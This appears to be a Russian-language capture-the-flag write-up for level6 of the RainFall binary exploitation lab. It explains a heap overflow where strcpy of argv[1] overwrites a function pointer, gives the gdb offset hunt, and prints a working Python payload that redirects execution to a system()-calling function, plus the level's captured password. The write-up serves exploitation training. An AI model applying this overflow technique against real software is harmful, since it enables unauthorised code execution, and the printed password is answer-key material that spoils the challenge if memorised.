Мы можем найти исполняемый файл, который выполняет сегментацию без параметра, и напечатать "Nope\n".

Проанализировав его с помощью gdb, мы видим, что функция main() вызывает функцию с именем m(), но существует также не вызываемая функция n().
Давайте поговорим о главном().

Существует вызов malloc(64), а затем strcpy argv[1] в эту область в куче. После этого мы можем увидеть вызов бесполезной функции m(), также хранящейся в буфере кучи (malloc(4)), которая просто вызывает puts().
Но есть вызов system() в полезной не вызываемой функции n().
Нам нужно выполнить функцию().
Первый аргумент (argv[1]) не ограничен, и, как мы уже говорили ранее, существует вызов strcpy(), который уязвим для переполнения буфера.
Мы должны создать полезную нагрузку, достаточно длинную, чтобы ее можно было скопировать во вторую область данных malloc.
Нам придется писать через eip, поэтому сначала получите смещение :

#level6@RainFall:~$ gdb level6
#(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
#
#Program received signal SIGSEGV, Segmentation fault.
#0x41346341 in ?? ()
#(gdb) info register eip
#eip            0x41346341       0x41346341
#(gdb)

Благодаря генератору шаблонов мы нашли смещение 72.
Наш последний буфер атаки будет выглядеть так :

    блокнот произвольных данных: 72 байта
    n() адрес: 4 байта

#level6@RainFall:~$ python -c 'print "A" * 72 + "\x54\x84\x04\x08"' > /tmp/exploit
#level6@RainFall:~$ cat /tmp/exploit | ./level6
#Segmentation fault (core dumped)
#level6@RainFall:~$

Очевидно, oбычный метод не может работать, потому что программа segfault без параметра

#level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
#f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
#level6@RainFall:~$ su level7
